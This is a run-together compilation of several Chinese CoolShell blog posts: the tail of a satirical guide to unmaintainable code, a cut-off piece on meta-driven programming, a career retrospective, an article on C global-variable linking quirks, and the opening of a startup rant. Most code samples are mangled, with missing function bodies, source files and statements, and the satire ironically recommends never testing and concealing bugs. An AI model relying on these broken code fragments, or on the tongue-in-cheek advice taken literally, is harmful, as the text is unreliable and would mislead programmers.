#### 测试* **从不测试** 。千万不要测试任何的出错处理，从来也不检测系统调用的返回值。   * **永远不做性能测试** 。如果不够快就告诉用户换一个更快的机器。如果你一做测试，那么就可能会要改你的算法，甚至重设计，重新架构。   * **不要写测试案例** 。不要做什么代码覆盖率测试，自动化测试。   * **测试是懦夫行为** 。一个勇敢的程序员是根本不需要这一步的。太多的程序太害怕他们的老板，害怕失去工作，害怕用户抱怨，甚至被起诉。这种担心害怕直接影响了生产力。如果你对你的代码有强大的信心，那还要什么测试呢？真正的程序员是不需要测试自己的代码的。#### 其它* **你的老板什么都知道** 。无论你的老板有多SB，你都要严格地遵照他的旨意办事，这样一来，你会学到更多的知识如何写出无法维护的代码来的。   * **颠覆Help Desk** 。你要确保你那满是bug的程序永远不要被维护团队知道。当用户打电话和写邮件给你的时候，你就不要理会，就算要理会，让用户重做系统或是告诉用户其帐号有问题，是标准的回答。   * **闭嘴** 。对于一些像y2k这样的大bug，你要学会守口如瓶，不要告诉任何人，包括你的亲人好友以及公司的同事和管理层，这样当到那一天的时候，你就可以用这个bug挣钱了。   * **忽悠** 。你会学会忽悠，就算你的代码写得很烂，你也要为其挂上GoF设计模式的标签，就算你的项目做得再烂，你也要为其挂上敏捷的标签，只有学会像中国Thoughtworks的咨询师那样去忽悠，你才能学会更炫更酷的方法，让整个团队和公司，甚至整个业界都开始躁动，这样才能真正为难维护的代码铺平道路。
这个文档中还有很多很多，实在是太TMD强大了，大家自己去看看吧。有精力有能力的朋友不妨把其翻译成中文。总之，我们的口号是——#### Write Everywhere, Read Nowhere（全文完）# 数据即代码：元驱动编程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢@文艺复兴记（todd） 投递此文）**几个小伙伴在考虑下面这个各个语言都会遇到的问题：**问题：设计一个命令行参数解析API**一个好的命令行参数解析库一般涉及到这几个常见的方面：1) 支持方便地生成帮助信息2) 支持子命令，比如：git包含了push, pull, commit等多种子命令3) 支持单字符选项、多字符选项、标志选项、参数选项等多种选项和位置参数4) 支持选项默认值，比如：–port选项若未指定认为50375) 支持使用模式，比如：tar命令的-c和-x是互斥选项，属于不同的使用模式经过一番考察，小伙伴们发现了这个几个有代表性的API设计：**1\. getopt()：**getopt()是libc的标准函数，很多语言中都能找到它的移植版本。
getopt()的核心是一个类似printf的格式字符串的命令行参数描述串，如上面的”ac:d:”定义了”a”, “c”，”d”3个命令行参数，其中，a是一个标志符不需要参数，”c”和”d”需要跟参数。getopt()功能非常弱，只支持单个字符的标志选项和参数选项。如果按上面的5点来比对，基本上只能说是勉强支持第3点，其他几项只能靠程序自己来实现了，所以，想直接基于getopt()实现一个像git这样复杂的命令行参数是不可能的，只有自己来做很多的解析工作。小伙伴们看过getopt()之后一致的评价是:图样图森破。**2\. Google gflags**接着，小伙伴们又发现了gflags这个Google出品C++命令行参数解析库。//C++     DEFINE_bool(memory_pool, false, "If use memory pool");     DEFINE_bool(daemon, true, "If started as daemon");     DEFINE_string(module_id, "", "Server module id");     DEFINE_int32(http_port, 80, "HTTP listen port");     DEFINE_int32(https_port, 443, "HTTPS listen port");
printf("Server module id: %s", FLAGS_module_id.c_str());Server server;return 0;     }小伙伴们看了后不由得感叹“真心好用啊”！的确，gflags简单地通过几个宏就定义了命令行选项，基本上很好的支持了上面提到的1，3，4这几项，比起getopt()来强多了。对于类似cp这样的小命令，gflags应该是够用了，但要达到git这种级别就显得有些单薄了。**3\. Ruby Commander**接下来小伙伴们又发现了Ruby Commander库：Commander库利用Ruby酷炫的语法定义了一种描述命令行参数的内部DSL，看起来相当高端大气上档次。除了上面的第5项之外，其他几项都有很好的支持，可以说Commander库的设计基本达到了git这种级别命令行参数解析的要求。只是，要搞懂Ruby这么炫的语法和这个库的使用方法恐怕就不如getopt()和gflags容易了。有小伙伴当场表示想要学习Ruby，但是也有小伙伴表示再看看其他库再说。**4\. Lisp cmdline库**接下来，小伙伴们发现了Lisp方言Racket的cmdline库。
//Lisp     (parse-command-line "compile" (current-command-line-arguments)     `((once-each     [("-v" "--verbose")     ,(lambda (flag) (verbose-mode #t))     ("Compile with verbose messages")]     [("-p" "--profile")     ,(lambda (flag) (profiling-on #t))     ("Compile with profiling")])     (once-any     [("-o" "--optimize-1")     ,(lambda (flag) (optimize-level 1))     ("Compile with optimization level 1")]     [("--optimize-2")     ,(lambda (flag) (optimize-level 2))     (("Compile with optimization level 2,"     "which implies all optimizations of level 1"))])     (multi     [("-l" "--link-flags")     ,(lambda (flag lf) (link-flags (cons lf (link-flags))))     ("Add a flag <lf> for the linker" "lf")]))     (lambda (flag-accum file) file)     '("filename"))
这是神马浮云啊?括号套括号，看起来很厉害的样子，但又不是很明白。看到这样的设计，有的小伙伴连评价都懒得评价了，但也有的小伙伴对Lisp越发崇拜，表示Lisp就是所谓的终极语言了，没有哪门语言能写出这么不明觉历的代码来！小伙伴们正准备打完收工，突然…**5\. Node.js的LineParser库**发现了Node.js的LineParser库:[javascript]   //JavaScript   var meta = {   program : ‘adb’,   name : ‘Android Debug Bridge’,   version : ‘1.0.3’,   subcommands : [ ‘connect’, ‘disconnect’, ‘install’ ],   options : {   flags : [   [ ‘h’, ‘help’, ‘print program usage’ ],   [ ‘r’, ‘reinstall’, ‘reinstall package’ ],   [ ‘l’, ‘localhost’, ‘localhost’ ]   ],   parameters : [   [ null, ‘host’, ‘adb server hostname or IP address’, null ],   [ ‘p’, ‘port’, ‘adb server port’, 5037 ]   ]   },   usages : [   [ ‘connect’, [‘host’, ‘[port]’], null, ‘connect to adb server’, adb_connect ],   [ ‘connect’, [ ‘l’ ], null, ‘connect to the local adb server’, adb_connect ],   [ ‘disconnect’, null, null, ‘disconnect from adb server’, adb_disconnect ],   [ ‘install’, [‘r’], [‘package’], ‘install package’, adb_install ],   [ null, [‘h’], null, ‘help’, adb_help ],   ]   };
try {   var lineparser = require(‘lineparser’);   var parser = lineparser.init(meta);   // adb_install will be invoked   parser.parse([‘install’, ‘-r’, ‘/pkgs/bird.apk’]);   }   catch (e) {   console.error(e);   }   [/javascript]天啊！？这是什么？我和小伙伴们彻底惊呆了！短短十几行代码就获得了上面5点的全面支持，重要的是小伙伴们居然一下子就看懂了，没有任何的遮遮掩掩和故弄玄虚。本来以为Ruby和Lisp很酷，小伙伴们都想马上去学Ruby和Lisp了，看到这个代码之后怎么感觉前面全是在装呢？有个小伙伴居然激动得哭着表示：我写代码多年，以为再也没有什么代码可以让我感动，没想到这段代码如此精妙，我不由得要赞叹了，实在是太漂亮了！小伙伴们的故事讲完了，您看懂了吗？如果没有看懂的话，正题开始了：在绝大多数语言中数据和代码可以说是泾渭分明，习惯C++、Java等主流语言的程序员很少去思考数据和代码之间的关系。与多数语言不同的是Lisp以“数据即代码，代码即数据”著称，Lisp用S表达式统一了数据和代码的形式而独树一帜。Lisp奇怪的S表达式和复杂的宏系统让许多人都感到Lisp很神秘，而多数Lisp教程要么强调函数式编程，要么鼓吹宏如何强大，反而掩盖了Lisp真正本质的东西，为此我曾写过一篇《Lisp的永恒之道》介绍Lisp思想。
设计思想和具体技术的区别在于前者往往可以在不同的环境中以不同的形式展现出来。比如，熟悉函数式编程的程序员在理解了纯函数的优点后即使是用C语言也会更倾向于写出无副作用的函数来，这就是函数式思想在命令式环境的应用。所以，理解Lisp思想一定要能在非Lisp环境应用，才算是融汇贯通。如果真正理解了Lisp的本质，那所谓的“数据即代码，代码即数据”一点儿也不神秘，这不就是我们每天打交道的配置文件吗！？如果你还不是很理解的话，我们通过下面几个问题慢慢分析：1) 配置的本质是什么？为什么要在程序中使用配置文件？不知道你是否意识到了，我们每天都在使用的各种各样的 **配置本质上是一种元数据也是一种DSL** ，这和Lisp基于S表达式的“数据即代码，代码即数据”没有本质区别。在C++、Java等程序中引入配置文件的目的正是用DSL弥补通用语言表达能力和灵活性的不足。我知道不少人喜欢从计算的角度来看到程序和语言，似乎只有图灵完备的语言如C++、Java、Python等才叫程序设计语言，而类似CSS和HTML这样的东西根本不能叫做程序设计语言。其实，在我看来这种观点过于狭隘， **程序的本质是语义的表达** ，而语义表达不一定要是计算。
2) 配置是数据还是代码？很明显，Both!说配置是数据，因为它是声明式的描述，能方便地修改和传输；说配置是代码，因为它在表达逻辑，你的程序实际上就是配置的解释器。3) 配置的格式是什么？配置的格式是任意的，可以自己定义语法，只要配以相应的解释器就行。不过更简单通用的做法是基于XML、JSON、或S表达式等标准结构，在此之上进一步定义schema。甚至完全不必是文件，在我们的项目中配置经常是放到用关系数据库中的。另外，下面我们还会看到用语言的Literal数据作为配置。4) 业务逻辑都可以放到配置中吗？这个问题的答案显然是：Yes！我没有遇到过不可以放入配置的逻辑，只是问题在于这样做是否值得，能达到什么效果。对于需要灵活变化，重复出现，有复用价值的东西放入作为配置是明智的选择。这篇文章的主要目的就在于介绍把 **主要业务逻辑都放到配置中，再通过程序解释执行配置的设计方法，我称之为：元驱动编程(Meta Driven Programming)** 。# 这多年来我一直在钻研的技术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!Architecture Internships Abroad因为我是看到tinyfool 《那些年我赶过的时髦技术趋势》，在赞叹的时候，也让我对我有好些回忆，所以想写一篇回忆贴，本来觉得回忆是件挺让人沮喪的事，因为是老了的表现，但我写着写着，就歪了楼。看来，我还不老，还在拼博。下面是很多我的唠叨，你喜欢就读读，不喜欢就TLDR – Too Long, Don’t Read!
自从98年毕业，到今天，参加工作有18个年头了，加上在大三的时候就为两个在外面接活的老师程序，到今天，写的程序被用到生产线也有18个年头了。#### 背景经历要说明我技术上的“性取向”，还得我说说的我的一些背景和经历。我这18年，大约分三个阶段：* **1996年-2000年** ： **入门乱来期** ，大三大四加在银行工作的两年。      * 用Powerbuilder/Delphi在WindowsNT/SQL Server上做了好多个MIS管理软件，有酒店的，有送水的，有OA的。     * 用Java的Applet做了一个Web的教学课件，用于在Win95/IE3.0中演示操作系统中的各种调度和算法的动画，得了个全国大学生挑战者杯的鼓励奖。     * 用Delphi的ISAPI技术以及PHP/ASP给一些公司和大学做过几个网站。* **2000年-2010年** ： **技术学习期** ，这十年，我主要的编程语言是C/C++。      * 前两年在银行用C语言在Unix（AIX/Solaris/Sco Unix/HP-UX..）写各种银行业务（用C语言写），用C写操作SQL，操作界面，写业务交易逻辑，一切都用C……，这是一个C语言的年代， **当时，全国的银行都在做大集中，银行是当时行业里最大的软件系统了，所以，我确定了C/C++/Unix的技术方向** ，我当时的网上签名是， _C/C++/Unix才是大规模杀伤性武器_ 。     * 然后，2002年在Platform做一个全平台的（包括Unix/Linux/Windows）高性能计算的软件产品，很像今天的Hadoop，当时叫Grid Computing，主要用低廉的x86集群进行大规模的并行计算，主要用于芯片设计行业，如：ARM和德州仪器，或是科研，如NASA，或是国家安全，如美国国防部的影像分析，或是3D动画渲染，如怪物史瑞克……从05年以后，发现很多用户开始从Unix迁移到Linux，于是开始更为关注Linux的Kernel知识。 **Platform有一套很严谨的软件工程体系，我对严谨的软件工程以及很多的基础的技术的认识在这里形成** 。     * 2007年在路透做路透全球金融数据Real-Time网络的高性能调优（我在《性能测试应该怎么做？》一文中透露过这个公司的性能要求，是一个实时的数据网络，对于99.9%的网络传输在100K的tps下要低于1ms，技术挑战是很大的），在路透，我只干一个事，就是性能优化，我把我负责的几个系统的性能都提升了8倍到15倍的样子，09年年底的时候，我已把未来3年的优化的活都干完了。所以，这个时期，我也开始了我的经理生涯。 **我对性能调优，高可用系统架构，研发管理的很多是在这里形成的。**   * **2010年到今天** ， **技术沉淀期** ，这个时间段，主要的编程语言是Java。      * 这段时间，我加入了Amazon和Alibaba，也就是所谓的互联网公司。在Amazon干了两个事，一个是把Amazon全球的marketplace连起来，跨大洲的数据中心的通信，还有一个是第一次接触大数据和机器学习——用户需求预测系统。在Alibaba干过电商云平台聚石塔和阿里云，去阿里最主要的是经历双十一。     * 这段时间，对我影响比较大的是Amazon，技术不再是我的瓶颈，大规模的系统，对我也不是问题，而让我收获最大的是， **世界前沿的软件设计架构和解决方案，以及做技术的态度和工程的方法，我的眼界、脑洞和视野都巨大的打开，并且在技术管理、工程管理、产品管理、人员管理、公司管理等等管理方面的思维有了质的提升** 。这段时间，才是我真正技术沉淀的时期。
我的这个背景本来可以更好一些，只可惜运气不太好，本来可以走的更快的，无奈在最关键的时候遇到了两次金融危机，本来可以去硅谷更牛更好的公司见世面，无奈父母身体欠安，只能放弃。#### 经历决定思维方式通过我的背景经历，大家不难看到，我基本上都是做一些规模比较大的系统和软件，而且，主要用C/C++/Unix/Linux这样比较晦涩的语言和操作系统。我们知道用C和C++开发，基本上要处理的错误都是和系统底层相应的东西，而上规模的系统和软件，又总是会遇到很多“稀奇古怪”的问题，这些问题，都会逼着我要去了解很多的操作系统、计算机系统、网络、数据库、中间件等等的各种基础或底层技术。而且我经历的基本上都是非常严谨的软件工程，不能马虎，我有几次马虎的经历，给我造成了非常大的心理影响，比如，曾经被定性为不适合写代码，因为我的代码太烂，或是出了严重的故障，几乎要跑路去了。另外，全球gloabl式的oncall，经常让我在凌晨被电话叫起来解决问题，这个经历比较痛苦。所以， **我的整个经历，让我养成了，在软件开发上必需也不得不严谨的习惯和价值观体系** 。**大家想想，用C/C++开发一个几乎不能出故障的软件系统，你需要多仔细和多严谨的态度才能达到要求？** 因此，我的经历让我不能马虎，也不能应付工作，更不能在标准上有所妥协，还需要不断地提高标准，所以，时间一长，我必然，会有如下的习惯：
* **要做到——知其然，知其所以然** 。所以，只能不断的学习基础知识以及和这个技术关联的知识，就像Wikipeida一样，当你进入一个词条的时候，就会伴随时一堆新词条，于是，当多年后，我看到 “ **知识广度是深度的副产品** ”这句话时，简直就是说到我的心里去了。* **要做出工业级的软件** 。从银行到Platform到Thomson Reuters再到Amazon，软件开发上都会有SLA的要求。我认为，一个软件是工业级还是民用级的，除了功能正确之外，最重要的一个指标之一就是在性能和稳定性上有没有SLA。绝大多数的互联网公司和开源软件都没有SLA。所以，达不到工业级的标准。 **要达到工业级的标准，就需要花费时间、人力和财力进行非常繁琐的设计、测试评估以及运维管理** 。* **工业级的软件来自工业级专业人员和专业软件工程** 。      * **专业的人员** 。为什么绝大多数的外国公司需要的是CS（Computer Science）背景毕业的工程师？因为他们要做的是工业级的软件，这是一门科学，即然是科学，就需要受过良好的科学教育的CS专业的人。     * **专业的工程** 。工业级的软件需要有工业级的软件工程，比如，严谨的Design/Code Review，严格的测试，以及完备的线上运维。     * **专业的工具** 。这个时候，你就会发现，要做到高级别的SLA，比如包括5个9以上的SLA，人肉干活的能力已经完全跟不上了，你需要大量的专业的与之配套工具。 **人类之所以聪明是因为会发明工具，所以，这也是工业级的另一个标准——你有多少现代化的支撑工具？**
在之前的《开发团队的效率》一文中，我说过—— **你总需要在一个环节上认真，这个环节越往前就越有效率，越往后你就越没效率** 。要么你设计和编码认真点，不然，你就得在测试上认真点。要是你设计、编码、测试都不认真，那你就得在运维上认真，就得在处理故障上认真。你总需要在一个地方认真。认真是痛苦和艰难的，也是需要苦苦坚持的，因为人太容易妥协了，这对每个人来说都是一种不小的挑战。老实说， **我与很多人对“认真”的标准不一样，所以，产生了很多分歧，很多人说我太理想了。其实，我能理解他们，一方面是因为我的标准是比较高了，另一方面是他们只做过民用级的软件。**另外，在一开始，做惯了工业级软件的我极度地不适应于那些糙快猛的开发方式。不过，我也在调整自己，毕竟，世界不只一种价值观，有的是工业级的软件，有的则是民用级的，还有的只是个玩具，而且还有Java这门语言非常有效地屏蔽了很多底层和基础知识，所以，也不可一概而论，我也在适应一些民用级的软件开发的方式。#### 后记从去年我从阿里离开到现在14个月了，这段时间内，我给大约40多家公司做过相应的技术咨询和解决过很多技术问题，绝大多数公司都是因为性能和稳定性的问题来找我的，我给这些公司解决问题的时候，基本都是这样的Pattern：
* 一开始，发现都是一些技术知识点的问题，   * 然后，马上进入到系统架构方面方面的问题，   * 当再解决架构问题的时候，我发现，已经是软件工程的问题，   * 而软件工程问题的后面，又是公司管理上的问题   * 而公司管理的问题，结果又到了人的问题上   * 而人的问题，又到了公司文化的问题……你看，很多问题，一环扣一环，最终都不是一个简单的技术问题。我倒不是说，我在抱怨这些问题，我更不是在说能解决这些问题，因为，就像软件工程没有银弹一样，无论你给什么样的解决方案都会有问题，没有问题才是不科学的。我能做的是，观察这个公司的业务形态、和相关的思维方式，以及现有的资源和相应的技术实力，帮助他们从技术到管理上缓解或改善现有的问题。所以，我基本上来说，这近20年来， **我只在专心研究一个事——如何做出一个性能高稳定性好的大规模的系统。** 在这个方向中，除了很多的基础和底层技术我需要吃透，我还需要在软件的开发工艺，软件工具，以及软件的线上运维，以及相关的管理上不断学习和思考， **因为，只有技术、工具、工程、运维、人员这几个方面搞好了，才可能出现一个性能高且稳定性好的系统** 。之前对于我来说，我一直在鼓吹先进的管理和软件工程以及技术和工具。今天，对我来说，遇到最大的问题就是，在没有这些所谓的先进的东西的时候，除了我自己上手外，我是否还能解决相应的问题？因为我自己已经完全Scale不开了。
有问题就有挑战，我每天都在思考，如何在不完美甚至残缺的环境下，解决这些公司的技术问题。每个人都要给自己一个目标。目前，我给自己的目标是—— **在残缺的环境下，能让用户不改一行代码，不动任何的架构，不改变用户很糟糕的软件开发的习惯，也不让用户作任何管理上的调整，能提升用户的软件系统的性能和稳定性** 。因为我相信技术，我相信有更好的技术，可以为用户完全透明的提升性能和稳定性，我大致找到了相应的解，现在，我正在实践的路上，这也许是笔大买卖，所以我不知天高地厚地注册了自己的公司……（全文完）# C语言全局变量那些事儿作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**作为一名程序员，如果说沉迷一门编程语言算作一种乐趣的话，那么与此同时反过来去黑一门编程语言就是这种乐趣的升华。今天我们就来黑一把C语言，好好展示一下这门经典语言令人抓狂的一面。我们知道，全局变量是C语言语法和语义中一个很重要的知识点，首先它的存在意义需要从三个不同角度去理解：对于程序员来说，它是一个记录内容的 **变量(variable)** ；对于编译/链接器来说，它是一个需要解析的 **符号(symbol)** ；对于计算机来说，它可能是具有地址的一块 **内存(memory)** 。其次是语法/语义：从作用域上看，带static关键字的全局变量范围只能限定在文件里，否则会外联到整个模块和项目中；从生存期来看，它是静态的，贯穿整个程序或模块运行期间（ **注意，正是跨单元访问和持续生存周期这两个特点使得全局变量往往成为一段受攻击代码的突破口，了解这一点十分重要** ）；从空间分配上看，定义且初始化的全局变量在编译时在数据段(.data)分配空间，定义但未初始化的全局变量 **暂存(tentative definition)** 在.bss段，编译时自动清零，而仅仅是声明的全局变量只能算个符号，寄存在编译器的符号表内，不会分配空间，直到链接或者运行时再重定向到相应的地址上。
我们将向您展现一下， **非static限定全局变量** 在编译/链接以及程序运行时会发生哪些有趣的事情，顺便可以对C编译器/链接器的解析原理管中窥豹。以下示例对ANSI C和GNU C标准都有效，笔者的编译环境是Ubuntu下的GCC-4.4.3。目录* 第一个例子   * 第二个例子   * 第三个例子   * 第四个例子#### 第一个例子/* t.h */     #ifndef _H_     #define _H_     int a;     #endifint main();int b;     int c;Makefile如下：test: main.o foo.o     gcc -o test main.o foo.omain.o: main.c     foo.o: foo.cclean:     rm *.o test运行情况：foo:	(&a)=0x0804a024     (&b)=0x0804a014     sizeof(b)=8     b.a=2     b.b=4     main:0x080483e4     main:	(&a)=0x0804a024     (&b)=0x0804a014     (&c)=0x0804a028     size(b)=4     b=2     c=0
这个项目里我们定义了四个全局变量，t.h头文件定义了一个整型a，main.c里定义了两个整型b和c并且未初始化，foo.c里定义了一个初始化了的结构体，还定义了一个main的函数指针变量。由于C语言每个源文件单独编译，所以t.h分别包含了两次，所以int a就被定义了两次。两个源文件里变量b和函数指针变量main被重复定义了，实际上可以看做代码段的地址。但编译器并未报错，只给出一条警告：`/usr/bin/ld: Warning: size of symbol 'b' changed from 4 in main.o to 8 in foo.o`运行程序发现，main.c打印中b大小是4个字节，而foo.c是8个字节，因为sizeof关键字是编译时决议，而源文件中对b类型定义不一样。但令人惊奇的是无论是在main.c还是foo.c中，a和b都是相同的地址，也就是说，a和b被定义了两次，b还是不同类型，但内存映像中只有一份拷贝。我们还看到，main.c中b的值居然就是foo.c中结构体第一个成员变量b.a的值，这证实了前面的推断—— **即便存在多次定义，内存中只有一份初始化的拷贝。** 另外在这里c是置身事外的一个独立变量。
为何会这样呢？这涉及到 **C编译器对多重定义的全局符号的解析和链接。** 在编译阶段，编译器将全局符号信息隐含地编码在可重定位目标文件的符号表里。这里有个 **“强符号(strong)”** 和 **“弱符号(weak)”** 的概念——前者指的是定义并且初始化了的变量，比如foo.c里的结构体b，后者指的是未定义或者定义但未初始化的变量，比如main.c里的整型b和c，还有两个源文件都包含头文件里的a。当符号被多重定义时，GNU链接器(ld)使用以下规则决议：* 不允许出现多个相同强符号。* 如果有一个强符号和多个弱符号，则选择强符号。* 如果有多个弱符号，那么先决议到size最大的那个，如果同样大小，则按照链接顺序选择第一个。像上面这个例子中，全局变量a和b存在重复定义。如果我们将main.c中的b初始化赋值，那么就存在两个强符号而违反了规则一，编译器报错。如果满足规则二，则仅仅提出警告，实际运行时决议的是foo.c中的强符号。而变量a都是弱符号，所以只选择一个（按照目标文件链接时的顺序）。事实上，这种规则是C语言里的一个大坑，编译器对这种全局变量多重定义的“纵容”很可能会无端修改某个变量，导致程序不确定行为。如果你还没有意识到事态严重性，我再举个例子。
#### 第二个例子int main();int b;     int c;运行情况如下：foo:	(&b)=0x0804a020     sizeof(b)=8     b.a=2     b.b=4     main:0x080484c8     parent:	(&b)=0x0804a020     (&c)=0x0804a034     sizeof(b)=4     b=2     c=0     wait child...     child:	sleep(1)     (&b):0x0804a020     (&c)=0x0804a034     sizeof(b)=4     set b=1     c=0     foo:	(&b)=0x0804a020     sizeof(b)=8     b.a=1     b.b=4     main:0x080484c8     parent:	child over     (&b)=0x0804a020     (&c)=0x0804a034     sizeof(b)=4     b=2     c=0（说明一点，运行情况是直接输出到stdout的打印，笔者曾经将./test输出重定向到log中，结果发现打印的执行序列不一致，所以采用默认输出。）
这是一个 **多进程环境** ，首先我们看到无论父进程还是子进程，main.c还是foo.c，全局变量b和c的地址仍然是一致的（当然只是个 **逻辑地址** ），而且对b的大小不同模块仍然有不同的决议。这里值得注意的是，我们在子进程中对变量b进行赋值动作，从此子进程本身包括foo()调用中，整型b以及结构体成员b.a的值都是1，而父进程中整型b和结构体成员b.a的值仍是2，但它们显示的逻辑地址仍是一致的。个人认为可以这样解释，fork创建新进程时，子进程获得了父进程上下文“镜像”（自然包括全局变量），虚拟地址相同但属于不同的进程空间，而且此时真正映射的物理地址中只有一份拷贝，所以b的值是相同的（都是2）。随后子进程对b改写，触发了操作系统的 **写时拷贝(copy on write)** 机制，这时物理内存中才产生真正的两份拷贝，分别映射到不同进程空间的虚拟地址上，但虚拟地址的值本身仍然不变，这对于应用程序来说是透明的，具有隐瞒性。还有一点值得注意，这个示例编译时没有出现第一个示例的警告，即对变量b的sizeof决议，笔者也不知道为什么，或许是GCC的一个bug？#### 第三个例子这个例子代码同上一个一致，只不过我们将foo.c做成一个静态链接库libfoo.a进行链接，这里只给出Makefile的改动。
test: main.o foo.o     ar rcs libfoo.a foo.o     gcc -static -o test main.o libfoo.amain.o: main.c     foo.o: foo.cclean:     rm -f *.o test运行情况如下：foo:	(&b)=0x080ca008     sizeof(b)=8     b.a=2     b.b=4     main:0x08048250     parent:	(&b)=0x080ca008     (&c)=0x080cc084     sizeof(b)=4     b=2     c=0     wait child...     child:	sleep(1)     (&b):0x080ca008     (&c)=0x080cc084     sizeof(b)=4     set b=1     c=0     foo:	(&b)=0x080ca008     sizeof(b)=8     b.a=1     b.b=4     main:0x08048250     parent:	child over     (&b)=0x080ca008     (&c)=0x080cc084     sizeof(b)=4     b=2     c=0
从这个例子看不出有啥差别，只不过使用 **静态链接** 后，全局变量加载的地址有所改变，b和c的地址之间似乎相隔更远了些。不过这次编译器倒是给出了变量b的sizeof决议警告。到此为止，有些人可能会对上面的例子嗤之以鼻，觉得这不过是列举了C语言的某些特性而已，算不上黑。有些人认为既然如此，对于一切全局变量要么用static限死，要么定义同时初始化，杜绝弱符号，以便在编译时报错检测出来。只要小心地使用，C语言还是很完美的嘛~对于抱这样想法的人，我只想说，请你在夜深人静的时候竖起耳朵仔细聆听，你很可能听到Dennis Richie在九泉之下邪恶的笑声——不，与其说是嘲笑，不如说是诅咒……#### 第四个例子int main();int b = 1;     int c = 1;int b;     int c;Makefile脚本：export LD_LIBRARY_PATH:=.all: test     ./testtest: t1.o t2.o     gcc -shared -fPIC -o libfoo.so foo.c     gcc -o test t1.o t2.o -L. -lfoo
t1.o: t1.c     t2.o: t2.c.PHONY:clean     clean:     rm -f *.o *.so test*执行结果：./test     t2:	(&b)=0x0804a01c     (&c)=0x0804a020     sizeof(b)=4     b=1     c=1     foo:	(&b)=0x0804a01c     sizeof(b)=8     b.a=4     b.b=4     main:0x08048564     t1:	(&b)=0x0804a01c     (&c)=0x0804a020     sizeof(b)=4     b=4     c=4     t2:	(&b)=0x0804a01c     (&c)=0x0804a020     sizeof(b)=4     b=4     c=4     foo:	(&b)=0x0804a01c     sizeof(b)=8     b.a=4     b.b=4     main:0x08048564     t1:	(&b)=0x0804a01c     (&c)=0x0804a020     sizeof(b)=4     b=4     c=4     ...
其实前面几个例子只是开胃小菜而已，真正的大坑终于出现了！而且这次编译器既没报错也没警告，但我们确实眼睁睁地看到作为main()中强符号的b被改写了，而且一旁的c也“躺枪”了。眼尖的读者发现，这次foo.c是作为动态链接库运行时加载的，当t1第一次调用t2时，libfoo.so还未加载，一旦调用了foo函数，b立马中弹，而且 **c的地址居然还相邻着b，这使得c一同中弹了。** 不过笔者有些无法解释这种行为的原因，有种说法是强符号的全局变量在数据段中是连续分布的（相应地弱符号暂存在.bss段或者符号表里），或许可以上报GNU的编译器开发小组。另外笔者尝试过将t1.c中的b和c定义前面加上 **const限定词** ，编译器仍然默认通过，但程序在main()中第一次调用foo()时触发了Segment fault异常导致奔溃，在foo.c里使用指针改写它也一样。 **推断这是GCC对const常量所在地址启用了类似操作系统写保护机制，但我无法确定早期版本的GCC是否会让这个const常量被改写而程序不会奔溃。**至于 **volatile关键词** 之于全局变量，自测似乎没有影响。怎么样？看了最后一个例子是否有点“不明觉厉”呢？C语言在你心目中是否还是当初那个“纯洁”、“干净”、“行为一致”的姑娘呢？也许趁着你不注意的时候她会偷偷给你戴顶绿帽，这一切都是通过全局变量，特别在动态链接的环境下，就算全部定义成强符号仍然无法为编译器所察觉。而一些IT界“恐怖分子”也经常 **将恶意代码包装成全局变量注入到root权限下存在漏洞的操作序列中，** 就像著名的栈溢出攻击那样。某一天当你傻傻地看着一个程序出现未定义的行为却无法定位原因的时候，请不要忘记Richie大爷那来自九泉之下最深沉的“问候”~
或许有些人会偷换概念，把这一切归咎于编译器和链接器身上，认为这同语言无关，但我要提醒你，正是编译/链接器的行为支撑了整个语言的语法和语义。你可以反过来思考一下为何C的胞弟C++推出 **“命名空间(namespace)”** 的概念，或者你可以使用其它高级语言，对于重定义的全局变量是否能通过编译这一关。所以请时刻谨记， **C是一门很恐怖的语言！**P.S.题外话写在最后。我无意挑起语言之争，只是就事论事地去 **“黑(hack)** **”** 一门语言而已，而且要黑就要黑得有理有力有层次，还要带点娱乐精神。其实黑一门语言并非什么尖端复杂的技术，个人觉得起码要做到两点：* **亲自动手写测试程序。** 动手写测试程序是开发人员必备的基础技能，只有现成的代码才能让人心服口服，那些只会停留在口头上的争论只能算作cheap hack。* **测试程序不能依赖于不成熟的代码。** 软件开发99%以上的bug都是基于不合格(substandard)开发人员导致，这并不能怪罪于语言以及编译器本身。使用诸如#define TRUE FALSE或者#define NULL 1之类的trick来黑C语言只能证明此人很有娱乐精神而不是真正的”hack value”，拿老北京梨园行当里的一句话——“那是下三滥的玩意儿”。
（全文完）# 来信， 创业 和 移动互联网作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn上一篇博文翻译了Steve Yegge的rant，这两天有一些事让我也想rant一下（所谓rant就是一篇巨长无比的抱怨和说教），不过无论是从见解还是恶搞来说肯定没有SteveY的水平高，所以，这篇博文只是单纯的rant，看标题就知道了，就像“ **篱笆，女人和狗** ”一样，乡土味实足。所以，下述的一些观点未必正确，也未必靠谱，也就是我的个人唠叨罢了，我想到哪里说到哪里。（篇幅较长，见谅）目录* 引子   * 邮件回复   * 创业 和 事业   * 移动互联网   * 结尾#### 引子我前两天，收到一封邮件，一位快要毕业的的大学生问我，是去百度，还是去创新工场？他在来信中说，从个人道德价值观来说，他想去创新工场，要远离流氓企业，不然会有狼狈为奸、助纣为虐的感觉，对不起自己。但是创新工场那边情况不熟悉， 不知道怎么选择，并问我现在比较热的移动互联网靠不靠谱。正好这两天我在微博里看到大家转贴李开复的几个让毕业生创业的微博，比如，这个微博，还有 这个微博。呵呵。
